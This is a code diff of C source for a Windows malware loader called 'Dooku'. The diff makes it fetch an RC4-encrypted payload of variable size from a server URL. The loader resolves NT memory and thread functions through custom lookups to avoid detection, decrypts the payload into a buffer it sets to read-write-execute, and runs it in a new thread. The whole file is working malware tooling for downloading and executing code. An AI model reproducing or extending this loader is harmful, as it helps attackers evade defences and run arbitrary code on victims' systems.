@@ -3,14 +3,12 @@
 //
 
 #include "Dooku.h"
+#include <stdio.h>
 #include "wchar.h"
 #include "Encrypt.h"
 #include "Http.h"
 #include <windows.h>
 #include "Win32.h"
-
-
-#define PAYLOAD_SIZE 276
 
 wchar_t ntdll[] = {'N', 'T', 'D', 'L', 'L', '.', 'D', 'L', 'L', '\0'};
 
@@ -46,7 +44,7 @@ const unsigned char key[] = {
 
 
 // Decrypt Key
-void Decrypt(LPVOID lpBuffer, LPVOID lpBufferTwo) {
+void Decrypt(LPVOID lpBuffer, LPVOID lpBufferTwo, size_t payloadSize) {
     // Initialization
     Rc4Context ctx = { 0 };
 
@@ -55,7 +53,7 @@ void Decrypt(LPVOID lpBuffer, LPVOID lpBufferTwo) {
     // Encryption //
     // plaintext - The payload to be encrypted
     // ciphertext - A buffer that is used to store the outputted encrypted data
-    rc4Cipher(&ctx, lpBuffer, lpBufferTwo, PAYLOAD_SIZE);
+    rc4Cipher(&ctx, lpBuffer, lpBufferTwo, payloadSize);
 }
 
 
@@ -71,8 +69,8 @@ BOOL WelcomeToTheDarkSide() {
     // RWX Buffer
     LPVOID lpBufferRunner   = NULL;
 
-    SIZE_T sSizeRunner      = PAYLOAD_SIZE;
-    SIZE_T sSize            = PAYLOAD_SIZE;
+    SIZE_T sSizeRunner      = 0;
+    SIZE_T sSize            = 0;
 
     ULONG oldAccess = 0;
 
@@ -83,23 +81,25 @@ BOOL WelcomeToTheDarkSide() {
         return -1;
     }
 
+    // Get Payload + PayloadSize
+    // Fetch Encrypted Payload From Server -> Save to lpBuffer (RW)
+    lpBuffer = FetchPayload(hProcess, &sSize);
+    if (lpBuffer == NULL) {
+        wprintf(L"Failed to Fetch Payload from Server\n");
+        return FALSE;
+    }
+
+
+    // Assign Runner Size to sSize
+    sSizeRunner = sSize;
+
     // Create RWX Runner Buffer
     // Allocating 16 bytes to the temp buffer
     NTSTATUS status = Instance->SithVirtualAlloc(hProcess, &lpBufferRunner, 0, &sSizeRunner, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    wprintf(L"Allocated Memory: %X\n", status);
     if (!NT_SUCCESS(status)) {
         return FALSE;
     }
 
-    wprintf(L"Allocated Memory at Address: %p\n", lpBuffer);
-
-    // Fetch Encrypted Payload From Server -> Save to lpBuffer (RW)
-    if (!InitConnection(hProcess, &lpBuffer)) {
-        wprintf(L"Failed to Connect %d\n", GetLastError());
-        return FALSE;
-    }
-
-    wprintf(L"Fetched Encrypted Payload From Server : %p\n", lpBuffer);
 
     // Change Permissions on Runner Buffer to RWX.
     status = Instance->SithVirtualProtect(hProcess, &lpBufferRunner, &sSizeRunner, PAGE_EXECUTE_READWRITE, &oldAccess);
@@ -109,7 +109,7 @@ BOOL WelcomeToTheDarkSide() {
     }
 
     // Decrypt Payload and Save to Runner Buffer
-    Decrypt(lpBuffer, lpBufferRunner);
+    Decrypt(lpBuffer, lpBufferRunner, sSize);
 
 
     // Setup Thread
@@ -138,7 +138,7 @@ BOOL WelcomeToTheDarkSide() {
 
 // Init Function
 // Start Ze Loading Of Ze Foonctionz!!
-BOOL PleasureOfYouToJoinUs() {
+BOOL PleasureOfYouToJoinUs(wchar_t *url) {
     Instance->SithOpenProcess           = (NtOpenProcess) MagicGetProcAddress(MagicGetModuleHandle(ntdll), ntOpenProcess);
     Instance->SithVirtualAlloc          = (NtAllocateVirtualMemory) MagicGetProcAddress(MagicGetModuleHandle(ntdll), ntAllocateVirtualMemory);
     Instance->SithVirtualProtect        = (NtProtectVirtualMemory) MagicGetProcAddress(MagicGetModuleHandle(ntdll), ntProtectVirtualMemory);
@@ -146,10 +146,10 @@ BOOL PleasureOfYouToJoinUs() {
     Instance->SithCreateThread          = (NtCreateThread) MagicGetProcAddress(MagicGetModuleHandle(ntdll), ntCreateThread);
     Instance->SithCreateThreadEx        = (NtCreateThreadEx) MagicGetProcAddress(MagicGetModuleHandle(ntdll), ntCreateThreadEx);
     Instance->SithQueueApcThread        = (NtQueueApcThread) MagicGetProcAddress(MagicGetModuleHandle(ntdll), ntQueueApcThread);
+    Instance->url = url;
 
-    //wcscpy(&Instance->url, url); // This breaks ze program
 
-    if (Instance->SithOpenProcess == NULL) {
+    if (Instance->SithOpenProcess == NULL) { // The others. Stop being lazy.
         return FALSE;
     }
     return TRUE;
